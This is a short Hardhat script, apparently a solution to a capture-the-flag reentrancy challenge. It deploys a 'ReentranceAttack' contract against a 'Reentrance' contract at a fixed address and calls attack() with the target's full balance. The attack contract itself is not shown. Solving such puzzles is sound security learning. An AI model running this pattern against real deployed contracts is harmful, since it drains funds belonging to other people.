import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x788F1E4a99fa704Edb43fAE71946cFFDDcC16ccB";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Reentrance", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("ReentranceAttack");
    const attackerContract = await attackerFactory.deploy(CONTRACT_ADDRESS);

    let balance = await ethers.provider.getBalance(CONTRACT_ADDRESS)
    await attackerContract.attack({ value: balance });
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
